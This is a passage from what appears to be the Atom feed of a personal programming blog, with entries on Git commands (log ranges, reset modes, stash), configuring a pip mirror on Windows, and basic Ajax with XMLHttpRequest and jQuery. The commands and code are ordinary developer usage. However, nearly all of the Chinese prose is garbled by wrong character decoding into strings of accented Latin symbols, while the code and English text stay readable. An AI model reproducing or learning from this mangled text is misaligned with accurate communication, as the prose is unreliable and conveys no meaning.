ç²—ç•¥æ˜¾ç¤º: <code>git log --oneline --graph --decorate --all</code></p>
<p>æ›´å¤šè¯·è¾“å…¥<code>git log --help</code>æŸ¥çœ‹man page.</p>
<p>æ›´æ”¹ä¸Šæ¬¡æäº¤: <code>git commit --amend</code>
å–æ¶ˆæš‚å­˜: <code>git reset HEAD [filename]</code>
å–æ¶ˆæš‚å­˜å¹¶ä¸¢å¼ƒç°æœ‰çš„æ›´æ”¹: <code>git reset HEAD --hard [filename]</code>, æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±
æ’¤é”€å¯¹æ–‡ä»¶çš„æ›´æ”¹: <code>git checkout -- [filename]</code>, æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±</p>
<p><code>git push origin --delete [branch]</code>, åˆ é™¤è¿œç¨‹åˆ†æ”¯</p>
<h1 id="3">3. åˆ†æ”¯æ“ä½œ</h1>
<p><code>git branch [branch]</code>, åœ¨å½“å‰å¼•ç”¨ä¸Šå»ºç«‹æ–°åˆ†æ”¯
<code>git checkout -b [branch]</code>, å»ºç«‹æ–°åˆ†æ”¯å¹¶æ£€å‡ºåˆ°è¯¥åˆ†æ”¯ä¸Š</p>
<p>commitå¼•ç”¨æ–¹å¼:</p>
<ul>
<li>
<p>ç›´æ¥hashå¼•ç”¨: <code>d921970aadf03b3cf0e71becdaab3147ba71cdef</code>, <code>d921970</code></p>
</li>
<li>
<p>åˆ†æ”¯å¼•ç”¨: <code>HEAD</code>, <code>master</code></p>
</li>
<li>
<p>ç›¸å¯¹å¼•ç”¨: <code>HEAD^</code>, <code>HEAD^^</code>, <code>HEAD~2</code></p>
</li>
<li>
<p>è‹¥<code>a</code>æ˜¯ä¸€ä¸ªåˆå¹¶æäº¤ï¼Œæœ‰ä¸¤ä¸ªçˆ¶å¼•ç”¨ï¼Œåˆ™<code>a^</code>ä¸ºaçš„ç¬¬ä¸€çˆ¶å¼•ç”¨ï¼Œ<code>a^2</code>ä¸ºaçš„ç¬¬äºŒçˆ¶å¼•ç”¨ã€‚</p>
</li>
<li>
<p>æ¡ä»¶å¼•ç”¨: <code>master@{yesterday}</code>, <code>master@{1.week.before}</code></p>
</li>
<li>
<p>å¼•ç”¨åŒºé—´:</p>
<ul>
<li><code>refA..refB</code>é€‰æ‹©ä»refAå’ŒrefBçš„å…±åŒç¥–å…ˆå¼€å§‹ç›´åˆ°refBçš„æ‰€æœ‰æäº¤ã€‚ä¾‹:</li>
</ul>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">è‹¥ 1 - 2 - 3 - 4 â† refA</div><div class="line">         \ 5 - 6 â† refB</div><div class="line">refA..refB å³ä¸º6 5, refB..refA å³ä¸º4 3.</div><div class="line">origin/master..masterä¸ºmasteråˆ†æ”¯ä¸Šè¿˜æœªæäº¤åˆ°è¿œç«¯çš„æ‰€æœ‰å¼•ç”¨</div></pre></td></tr></table></figure>
<ul>
<li>åŒºé—´ç­›é€‰ï¼Œä¾‹ï¼šä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ç­‰ä»·ï¼š
<code>$ git log refA..refB</code>
<code>$ git log ^refA refB</code>
<code>$ git log refB --not refA</code></li>
<li><code>refA...refB</code>é€‰æ‹©å‡ºè¢«ä¸¤ä¸ªå¼•ç”¨ä¸­çš„ä¸€ä¸ªåŒ…å«ä½†åˆä¸è¢«ä¸¤è€…åŒæ—¶åŒ…å«çš„æäº¤ï¼Œå³<code>refA..refB</code>+<code>refB..refA</code></li>
</ul>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ git log --left-to-right refA...refB</div><div class="line">&lt; 4</div><div class="line">&lt; 3</div><div class="line">&gt; 6</div><div class="line">&gt; 5</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="4">4. å·¥ä½œå‚¨è—</h1>
<p><code>git stash &quot;comments&quot;</code>, å‚¨è—æ‰€æœ‰å·¥ä½œï¼ŒåŒ…æ‹¬å·²æ·»åŠ çš„å’Œå·²æ›´æ”¹æœªæ·»åŠ çš„
<code>git stash apply stash@{0}</code>, æ¢å¤å‚¨è—ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå†²çªï¼Œè§£å†³å†²çªå<code>git add</code>æ·»åŠ 
<code>git stash list</code>, åˆ—å‡ºå‚¨è—æ ˆ
<code>git stash show [stashname]</code>, æŸ¥çœ‹å‚¨è—çš„æ›´æ”¹
<code>git stash pop</code>, åº”ç”¨æ ˆé¡¶å‚¨è—å¹¶å¼¹å‡ºå‚¨è—
<code>git stash drop [stashname]</code>, åˆ é™¤å‚¨è—
<code>git stash branch [branchname]</code>, åº”ç”¨å‚¨è—åˆ°æŸåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯
<code>git stash --keep-index</code>, åªå‚¨è—å·²æ›´æ”¹æœªæ·»åŠ çš„æ”¹åŠ¨ï¼Œä¸å‚¨è— å·²æ·»åŠ çš„
<code>git stash --include-untracked</code>, å‚¨è—æœªè¿½è¸ªçš„æ–‡ä»¶ï¼ˆæœªè¿½è¸ªæ–‡ä»¶ï¼‰å¹¶å°†å…¶ä»å·¥ä½œç›®å½•ä¸­åˆ é™¤
<code>git stash --all</code>, è´®è—æ‰€æœ‰æ–‡ä»¶</p>
<h1 id="5-git-reset">5. git reset</h1>
<p><code>git reset --soft HEAD^</code>, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­æ‰€æœ‰çš„æ–‡ä»¶å‡æ·»åŠ æš‚å­˜(staged), ç±»ä¼¼â€œæ’¤é”€<code>git commit</code>å‘½ä»¤â€ï¼Œä½†å¦‚æœé‡æ–°æäº¤ï¼Œä¼šåˆ›é€ ä¸€ä¸ªhashä¸åŒçš„commitï¼Œå³æ—¶æäº¤å†…å®¹å®Œå…¨ç›¸åŒã€‚
<code>git reset --mixed HEAD^</code>, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹æœªæš‚å­˜(modified but not staged), ç±»ä¼¼â€œæ’¤é”€<code>git add</code>å’Œ<code>git commit</code>å‘½ä»¤â€
<code>git reset --hard HEAD^</code>, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹å®Œå…¨ä¸¢å¤±ï¼Œç›¸å½“äºâ€œæ’¤é”€æ›´æ”¹, <code>git add</code>å’Œ<code>git commit</code>â€.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="éšæ‰‹è®°" scheme="//blog.stdioa.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
    
    
      <category term="Git" scheme="//blog.stdioa.com/tags/Git/"/>
    
      <category term="ç¼–ç¨‹å·¥å…·" scheme="//blog.stdioa.com/tags/%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>éšæ‰‹è®° - ç”¨å›½å†…é•œåƒåŠ é€Ÿpip</title>
    <link href="//blog.stdioa.com/2015/09/essay-pip-acceleration/"/>
    <id>//blog.stdioa.com/2015/09/essay-pip-acceleration/</id>
    <published>2015-09-29T15:01:00.000Z</published>
    <updated>2016-11-08T13:48:35.491Z</updated>
    
    <content type="html"><![CDATA[<p>åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚</p>
<a id="more"></a>
<h1 id="1">1. å¼•å­</h1>
<p>å¶ç„¶å‘ç°USTCæœ‰ä¸€ä¸ªpypiçš„æº(<a href="http://mirrors.ustc.edu.cn/pypi/" target="_blank" rel="external">åœ¨è¿™é‡Œ</a>)ï¼Œç…§ç€USTCç»™çš„<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/pypi" target="_blank" rel="external">é•œåƒä½¿ç”¨å¸®åŠ©</a>æ›´æ”¹é•œåƒæºæ— æœã€‚ä»Šå¤©é—²æ¥æ— äº‹å°±å¤šæœäº†ä¸€ä¸‹ã€‚</p>
<h1 id="2">2. è¿‡ç¨‹</h1>
<p>USTCçš„é•œåƒä½¿ç”¨å¸®åŠ©é‡Œè¯´ï¼Œå°†<code>index-url = https://pypi.mirrors.ustc.edu.cn/simple</code>æ·»åŠ åˆ°<code>~/.pip/pip.conf</code>æ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§æ­¤æ€è·¯çœ‹ï¼Œå¦‚æœæˆ‘åœ¨Windowsä¸‹ä½¿ç”¨çš„è¯ï¼Œåº”è¯¥å°†é…ç½®ä¿¡æ¯æ·»åŠ åˆ°<code>C:\Users\Stdio\.pip\pip.conf</code>æ–‡ä»¶ä¸­ã€‚ç„¶è€Œæ·»åŠ åå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚ä»Šå¤©çœ‹è§ä¸€ä¸ª<a href="http://blog.csdn.net/sasoritattoo/article/details/10020547" target="_blank" rel="external">åšæ–‡</a>è¯´æ–‡ä»¶è®¾ç½®è·¯å¾„åº”ä¸º<code>%HOME%\pip\pip.ini</code>ï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹ï¼ˆç»å¯¹è·¯å¾„ä¸º<code>C:\Users\Stdio\pip\pip.ini</code>ï¼‰ï¼ŒæˆåŠŸã€‚ç”¨äº†USTCçš„æºï¼Œè£…ä¸ªè½¯ä»¶é€Ÿåº¦ç®€ç›´é£èµ·ï¸¿(ï¿£ï¸¶ï¿£)ï¸¿<br>
å¼„å¥½ä»¥åå¤šäº†ä¸ªå¿ƒçœ¼ï¼Œå»çœ‹çœ‹å®˜æ–¹æ€ä¹ˆè¯´ï¼Œäºæ˜¯æ‰¾åˆ°äº†pipçš„Documentationï¼ˆ<a href="https://pip.pypa.io/en/stable/user_guide/#configuration" target="_blank" rel="external">åœ¨è¿™é‡Œ</a>ï¼‰é‡Œé¢è®²è¿°äº†é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Config file</div><div class="line">pip allows you to set all command line option defaults in a standard ini style config file.</div><div class="line"></div><div class="line">The names and locations of the configuration files vary slightly across platforms. You may have per-user, per-virtualenv or site-wide (shared amongst all users) configuration:</div><div class="line"></div><div class="line">Per-user:</div><div class="line"></div><div class="line">On Unix the default configuration file is: $HOME/.config/pip/pip.conf which respects the XDG<span class="emphasis">_CONFIG_</span>HOME environment variable.</div><div class="line">On Mac OS X the configuration file is $HOME/Library/Application Support/pip/pip.conf.</div><div class="line">On Windows the configuration file is %APPDATA%\pip\pip.ini.</div><div class="line">There are also a legacy per-user configuration file which is also respected, these are located at:</div><div class="line"></div><div class="line">On Unix and Mac OS X the configuration file is: $HOME/.pip/pip.conf</div><div class="line">On Windows the configuration file is: %HOME%\pip\pip.ini</div><div class="line">You can set a custom path location for this config file using the environment variable PIP<span class="emphasis">_CONFIG_</span>FILE.</div><div class="line"></div><div class="line">Inside a virtualenv:</div><div class="line"></div><div class="line">On Unix and Mac OS X the file is $VIRTUAL_ENV/pip.conf</div><div class="line">On Windows the file is: %VIRTUAL_ENV%\pip.ini</div></pre></td></tr></table></figure>
<p>äºæ˜¯è‡ªå·±å°†é…ç½®æ–‡ä»¶æ”¾åœ¨äº†<code>%APPDATA%\pip\pip.ini</code>ï¼Œå³<code>C:\Users\Stdio\AppData\Roaming\pip\pip.ini</code>ä¸‹ï¼Œç»å®éªŒï¼ŒåŠ é€ŸæˆåŠŸã€‚
ç»æµ‹è¯•ï¼Œç³»ç»Ÿå±‚é¢çš„å…¨å±€è®¾ç½®ä¼šå½±å“åˆ°virtualenvå»ºç«‹çš„è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„é…ç½®æ–‡ä»¶æ¥æ›´æ”¹è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œè®¾ç½®æ–‡ä»¶å°±æ”¾åœ¨è™šæ‹Ÿç¯å¢ƒæ ¹ç›®å½•ä¸‹å°±å¥½äº†ã€‚</p>
<h1 id="3">3. çå†™</h1>
<p>æ”¹äº†è½¯ä»¶æºä»¥åä¸ºäº†åšæµ‹è¯•å‡çº§äº†numpyï¼Œç„¶åç¼–è¯‘ç”¨äº†åŠå¤©ä¸­é—´ç”µè„‘å¡åˆ°æ­»ï¼Œç°åœ¨å®ƒè¿˜åœ¨æˆ‘çš„è…¿ä¸Šå‘çƒ«çœŸæ˜¯ä¼¤ä¸èµ·- -<br>
å†™çš„ä¸œè¥¿è¶Šæ¥è¶Šæ²¡æœ‰è¥å…»äº†ï¼Œå°±å½“æ˜¯å†™ç€ç©é¡ºå¸¦ç§¯ç´¯ä¸€ä¸‹çŸ¥è¯†å§ã€‚å¦‚æœä¸å‡ºæ„å¤–çš„è¯ï¼Œä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯å…³äºPython Qt Createrå’ŒQt GUIè®¾è®¡çš„å°æ–‡ç« 0.0ä¹Ÿè®¸æ˜¯virtualenvçš„éšæ‰‹è®°å§ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="éšæ‰‹è®°" scheme="//blog.stdioa.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="pip" scheme="//blog.stdioa.com/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>ç‚¹ç‚¹æŠ€èƒ½ç‚¹ä¹‹Ajax</title>
    <link href="//blog.stdioa.com/2015/09/essay-ajax/"/>
    <id>//blog.stdioa.com/2015/09/essay-ajax/</id>
    <published>2015-09-22T13:07:00.000Z</published>
    <updated>2016-11-08T13:48:35.475Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™šäº†å•Šï¼ï¼‰</p>
<a id="more"></a>
<h1 id="1">1. å¼•å­</h1>
<p>æ²¡å•¥å¯å†™çš„â€¦</p>
<h1 id="2">2. ç§‘æ™®</h1>
<p><a href="http://www.w3school.com.cn/ajax/index.asp" target="_blank" rel="external">W3School - Ajaxæ•™ç¨‹</a>ï¼Œå°±è¿™ä¸ªå§ï¼Œç§‘æ™®å®Œæ¯•ã€‚</p>
<h1 id="3">3. ç¬”è®°</h1>
<h2 id="31-ajax">3.1 Ajaxçš„ç‰¹ç‚¹</h2>
<p>Ajaxä¸ºAsynchronous Javascript And XMLçš„ç¼©å†™ï¼Œå³å¼‚æ­¥JSä¸XMLï¼Œå› ä¸ºå®ƒå…·æœ‰å¼‚æ­¥ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç½‘é¡µåŠ è½½ä¸­æˆ–åŠ è½½ç»“æŸçš„ä»»æ„æ—¶åˆ»ä½¿ç”¨ï¼Œé€šè¿‡ä¸æœåŠ¡å™¨è¿›è¡Œå°‘é‡æ•°æ®äº¤æ¢æ¥å®ç°ç½‘é¡µå¼‚æ­¥æ›´æ–°ã€‚åˆ©ç”¨Ajaxå¯ä»¥ç›´æ¥æ›´æ”¹ç½‘é¡µçš„ä¸€éƒ¨åˆ†æ¥åŠ¨æ€åˆ·æ–°ç½‘é¡µï¼Œè€Œä¸éœ€è¦åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚</p>
<h2 id="32">3.2 ä½¿ç”¨æ–¹æ³•â€”â€”åŸç”Ÿæ–¹å¼</h2>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ajax = <span class="keyword">new</span> XMLHttpRequest();                  <span class="comment">// IE6ä¸èƒ½ç”¨è¿™ä¸ªæ–¹å¼ï¼Œä¸ç®¡å®ƒäº†</span></div><div class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">// do something with ajax.responseText</span></div><div class="line">        <span class="comment">// è¿˜æœ‰ä¸€ä¸ªajax.responseXML, ä¹Ÿä¸ç®¡å®ƒäº†ï¼Œjsonå¤§æ³•å¥½</span></div><div class="line">        alert(ajax.responseText);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ajax.open(<span class="string">"GET"</span>, <span class="string">"./get?var1=val1&amp;var2=val2"</span>, <span class="literal">true</span>);     <span class="comment">// å¼‚æ­¥æ–¹å¼è¿è¡Œ</span></div><div class="line">ajax.send();</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ajax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">ajax.open(<span class="string">"POST"</span>, <span class="string">"./post"</span>, <span class="literal">false</span>);                      <span class="comment">// åŒæ­¥æ–¹å¼è¿è¡Œ</span></div><div class="line">ajax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">ajax.send(<span class="string">"var1=val1&amp;var2=val2"</span>);</div><div class="line"><span class="comment">// do something with ajax.responseText</span></div><div class="line">alert(ajax.responseText);</div></pre></td></tr></table></figure>
<h2 id="33-jquery-ajax">3.3 åŸç”Ÿçš„å¥½éº»çƒ¦ï¼â€”â€”jQuery Ajax</h2>
<p><a href="http://jquery.com/" target="_blank" rel="external">jQuery</a>ï¼Œæ£’æ£’çš„å‰ç«¯åº“ï¼Œä¸å¤šè¯´ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// $.get(URL, callback)</span></div><div class="line">$.get(<span class="string">"./get?var1=val1&amp;var2=val2"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>) </span>&#123;</div><div class="line">        <span class="comment">// do something with data &amp; status</span></div><div class="line">    &#125;);</div><div class="line"><span class="comment">// $.post(URL,data,callback)</span></div><div class="line">$.post(<span class="string">"./post"</span>, &#123;</div><div class="line">        <span class="attr">var1</span>: <span class="string">"val1"</span>,</div><div class="line">        <span class="attr">var2</span>: <span class="string">"val2"</span></div><div class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>) </span>&#123;</div><div class="line">        <span class="comment">// do something with data &amp; status</span></div><div class="line">    &#125;);</div><div class="line"><span class="comment">// $.getJSON(url, data, success(data,status,xhr))</span></div><div class="line"><span class="comment">// dataå’Œå›è°ƒå‡½æ•°successå¯é€‰</span></div><div class="line"><span class="comment">// successä¸­ï¼Œdataå‚æ•°å¿…éœ€ï¼Œå…¶å®ƒå¯é€‰</span></div><div class="line">$.getJSON(<span class="string">"./get"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">        <span class="comment">// do something with data</span></div><div class="line">    &#125;);</div></pre></td></tr></table></figure>
<h1 id="4">4. é™„å¸¦çš„å°é›¶ç¢</h1>
<p><code>window.setInterval(getData, time);</code>ç”¨äºå®ç°è½®è¯¢ã€‚</p>
<h1 id="5">5. æ€»ç»“ &amp; åè®°</h1>
<p>Ajaxç®€å•å®ç”¨åŠŸèƒ½å¼ºå¤§åº”ç”¨å¹¿æ³›ï¼Œé€šè¿‡ç®€å•çš„æ­¥éª¤å®ç°å‰åç«¯çš„æ•°æ®äº¤æ¢ï¼Œæ¥å®ç°ç½‘é¡µçš„åŠ¨æ€åŠ è½½ã€‚<br>
å¼€å­¦åˆ°ç°åœ¨æ„Ÿè§‰ä¸€ç›´ä¸åœ¨çŠ¶æ€ï¼ˆå®åœ¨æ˜¯æƒ³åæ§½è‡ªå·±çš„ä¸€ç¾¤ç¥ä¸€æ ·çš„èˆå‹ï¼‰ï¼Œä»Šå¤©æ‰¾äº†ä¸ªå®‰é™çš„ã€æ²¡äººæ‰“æ‰°çš„åœ°æ–¹è®¤è®¤çœŸçœŸå†™äº†å†™ä»£ç ï¼Œæ€»ç»“äº†ä¸€ä¸‹è‡ªå·±åˆ°ç°åœ¨æ‰€å­¦çš„çŸ¥è¯†æ‰å‘ç°è‡ªå·±å­¦çš„ä¸œè¥¿æ˜¯å¦‚æ­¤é›¶æ•£ã€ä¸æˆä½“ç³»ï¼Œä»¿ä½›ä»å¤§ä¸€å¼€å§‹å°±åœ¨ä¹±ç‚¹æŠ€èƒ½ç‚¹ã€‚è¿™ä¸€å¹´è¦å¤šæ·±å…¥å­¦ä¹ ä¸€ä¸ªç‰¹å®šæ–¹é¢çš„çŸ¥è¯†ï¼ˆæš‚å®šåç«¯å¼€å‘ï¼‰ï¼Œå¤šå†™ä»£ç ç§¯ç´¯ç»éªŒï¼Œä¸èƒ½å†ä¸œå­¦ä¸€ç‚¹è¥¿å­¦ä¸€ç‚¹äº†ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™šäº†å•Šï¼ï¼‰&lt;/p&gt;
    
    </summary>
    
      <category term="ç½‘ç»œ" scheme="//blog.stdioa.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="å‰ç«¯å¼€å‘" scheme="//blog.stdioa.com/tags/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
      <category term="Ajax" scheme="//blog.stdioa.com/tags/Ajax/"/>
    
  </entry>
  
</feed>
